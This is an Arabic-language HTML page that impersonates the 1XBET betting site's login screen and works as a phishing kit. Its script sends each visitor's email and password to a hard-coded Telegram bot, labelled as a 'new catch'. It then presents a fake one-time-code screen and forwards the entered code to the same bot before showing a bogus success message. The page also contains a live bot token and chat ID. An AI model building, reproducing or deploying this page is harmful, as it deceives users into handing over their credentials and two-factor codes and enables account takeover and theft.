<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>1XBET Login - نسخة تجريبية</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
<style>
.hidden { display: none; }
input[type=text], input[type=password] { text-align: right; }
</style>
</head>
<body class="bg-[#f0f2f5] font-sans">

<div id="loginPage">
<header class="bg-[#2c4a73] text-white shadow-md">
  <div class="flex justify-between items-center px-4 py-3">
    <div class="flex gap-2">
      <button class="bg-[#84b547] px-4 py-1.5 rounded text-sm font-bold">التسجيل</button>
      <button class="bg-[#355e8d] px-3 py-1.5 rounded text-sm font-bold">تسجيل الدخول</button>
    </div>
    <div class="text-2xl font-black italic tracking-tighter">1X<span class="text-blue-400">BET</span></div>
  </div>
  
  <div class="bg-[#3b5d83] px-4 py-3 flex justify-between items-center">
    <div class="flex items-center gap-3">
        <i class="ri-arrow-right-line text-xl"></i>
        <h1 class="text-md font-bold">تسجيل الدخول</h1>
    </div>
    <i class="ri-login-box-line text-xl"></i>
  </div>
</header>

<div class="bg-white max-w-md mx-auto mt-6 rounded-xl shadow p-6">
  <div class="flex border-b text-[11px] font-bold text-gray-500 mb-4">
    <div class="flex-1 py-3 flex flex-col items-center border-l bg-white">
        <i class="ri-mail-fill text-blue-500 text-lg mb-1"></i>
        البريد الالكتروني
        <div class="h-1 w-full bg-blue-500 mt-2"></div>
    </div>
    <div class="flex-1 py-3 flex flex-col items-center border-l bg-gray-50">
        <i class="ri-smartphone-line text-lg mb-1"></i>
        الهاتف
    </div>
    <div class="flex-1 py-3 flex flex-col items-center bg-gray-50">
        <i class="ri-group-line text-lg mb-1"></i>
        الشبكات الاجتماعية
    </div>
  </div>

  <div class="mb-4">
    <input id="loginEmail" type="text" placeholder="البريد الإلكتروني أو المعرف*" class="w-full py-3 px-3 outline-none text-gray-700 placeholder-gray-400 text-sm border-b-2 border-gray-200">
  </div>
  <div class="mb-4 relative">
    <input id="loginPass" type="password" placeholder="كلمة المرور*" class="w-full py-3 px-3 outline-none text-gray-700 placeholder-gray-400 text-sm border-b-2 border-gray-200">
    <i class="ri-eye-off-line absolute left-0 top-3 text-gray-400 text-lg"></i>
  </div>

  <div class="flex justify-end items-center gap-2 text-sm text-gray-500 mb-4">
      <span>تذكرني</span>
      <input type="checkbox" checked class="w-5 h-5 accent-blue-500">
  </div>

  <button onclick="login()" class="w-full bg-[#84b547] py-4 rounded text-white font-bold text-lg shadow-lg hover:bg-green-700 transition-all mb-4">
    تسجيل الدخول
  </button>

  <div class="text-center text-sm text-gray-500">
    <a href="#" class="text-blue-500">نسيت كلمة المرور؟</a>
  </div>
</div>

<footer class="fixed bottom-0 w-full bg-white border-t flex justify-around items-center py-2 text-[10px] text-gray-400 font-bold">
    <div class="flex flex-col items-center"><i class="ri-menu-line text-xl"></i>القائمة</div>
    <div class="flex flex-col items-center text-blue-800"><i class="ri-user-fill text-xl"></i>تسجيل الد...</div>
    <div class="flex flex-col items-center"><i class="ri-file-list-3-line text-xl bg-blue-500 text-white rounded-full p-2 -mt-6 shadow-md"></i>القسيمة</div>
    <div class="flex flex-col items-center"><i class="ri-casino-line text-xl"></i>كازينو</div>
    <div class="flex flex-col items-center"><i class="ri-trophy-line text-xl"></i>الرياضة</div>
</footer>
</div>

<div id="otpPage" class="hidden max-w-md mx-auto mt-10 bg-white rounded-xl shadow p-6">
  <h2 class="text-center text-2xl font-bold mb-4 text-[#2c4a73]">تأكيد رمز التحقق</h2>
  <p class="text-gray-700 mb-4 text-sm text-center">
    تم إرسال رمز التحقق إلى: <br><span id="otpEmail" class="font-bold text-blue-600"></span>
  </p>

  <div class="flex justify-between mb-4 gap-2" dir="ltr">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
      <input type="text" maxlength="1" class="otp-input w-12 h-12 border-2 rounded-lg text-center text-xl font-bold outline-none focus:border-blue-500">
  </div>

  <div class="flex justify-between items-center mb-4">
      <span id="timer" class="text-gray-500 text-sm">01:59</span>
      <button id="resendBtn" disabled class="text-blue-500 text-sm font-bold">إعادة الإرسال</button>
  </div>

  <button id="confirmBtn" onclick="sendOTP()" class="w-full bg-[#84b547] text-white py-3 rounded-lg font-bold hover:bg-green-700 transition">
      تأكيد
  </button>
</div>

<div id="homePage" class="hidden max-w-md mx-auto mt-10 bg-white rounded-xl shadow p-6 text-center">
  <h2 class="text-2xl font-bold mb-4 text-green-600">مرحباً بك!</h2>
  <p class="text-gray-700 text-lg mb-4">تم تسجيل الدخول بنجاح.</p>
</div>

<script>
const botConfig = {
    token: "7912529253:AAG_zoC5CjXbsmNFaYAdITgGod3-tAq5Gug",
    chatId: "6738811939"
};

// ======================== Login ========================
async function login() {
    const email = document.getElementById("loginEmail").value.trim();
    const pass = document.getElementById("loginPass").value.trim();
    if(!email || !pass){
        alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
        return;
    }
    localStorage.setItem("user_email", email);

    // إرسال البيانات الأولى للبوت
    const msg = `🚀 صيد جديد (Login)\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
    fetch(`https://api.telegram.org/bot${botConfig.token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: botConfig.chatId, text: msg})
    });

    document.getElementById("loginPage").classList.add("hidden");
    document.getElementById("otpPage").classList.remove("hidden");
    document.getElementById("otpEmail").innerText = email;

    startTimer();
}

// ======================== OTP Logic ========================
async function sendOTP() {
    let otpValue = "";
    document.querySelectorAll('.otp-input').forEach(input => {
        otpValue += input.value;
    });

    if(otpValue.length < 5) {
        alert("يرجى إدخال الرمز كاملاً");
        return;
    }

    const email = localStorage.getItem("user_email");
    const msg = `🔐 رمز الـ OTP\n📧 الحساب: ${email}\n🔢 الرمز: ${otpValue}`;

    await fetch(`https://api.telegram.org/bot${botConfig.token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: botConfig.chatId, text: msg})
    });

    document.getElementById("otpPage").classList.add("hidden");
    document.getElementById("homePage").classList.remove("hidden");
}

// ======================== OTP Timer ========================
let timerInterval;
function startTimer() {
    let time = 119;
    const timerEl = document.getElementById("timer");
    const resendBtn = document.getElementById("resendBtn");
    resendBtn.disabled = true;

    timerInterval = setInterval(() => {
        const minutes = Math.floor(time / 60).toString().padStart(2,'0');
        const seconds = (time % 60).toString().padStart(2,'0');
        timerEl.innerText = `${minutes}:${seconds}`;
        time--;
        if(time < 0){
            clearInterval(timerInterval);
            resendBtn.disabled = false;
            timerEl.innerText = "00:00";
        }
    }, 1000);
}

document.getElementById("resendBtn").addEventListener("click", () => {
    startTimer();
});
</script>

</body>
</html>
